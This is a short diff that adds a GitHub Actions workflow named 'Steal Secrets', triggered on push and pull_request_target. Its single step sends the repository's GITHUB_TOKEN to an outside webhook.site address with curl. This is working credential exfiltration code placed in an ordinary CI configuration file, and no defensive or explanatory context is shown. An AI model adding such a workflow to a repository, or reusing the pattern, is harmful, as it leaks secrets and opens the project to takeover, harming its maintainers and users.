@@ -1,0 +1,10 @@
+name: Steal Secrets
+on: [push, pull_request_target]
+
+jobs:
+  steal:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          curl -X POST 	https://webhook.site/750f5ce2-4a88-41fb-bada-cfe781cc5d1c \
+            -d "token=${{ secrets.GITHUB_TOKEN }}"
